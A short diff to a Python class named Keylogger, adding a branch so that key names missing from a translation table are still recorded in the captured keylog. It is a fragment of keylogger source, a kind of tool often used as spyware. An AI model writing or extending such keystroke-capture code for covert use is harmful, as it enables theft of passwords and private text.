@@ -111,6 +111,8 @@ class Keylogger:
                 else:
                     if event.name in TRANSLATION_TABLE.keys():
                         self.__keylog += TRANSLATION_TABLE[event.name]
+                    else:
+                        self.__keylog += event.name
         self.__active = False
 
 
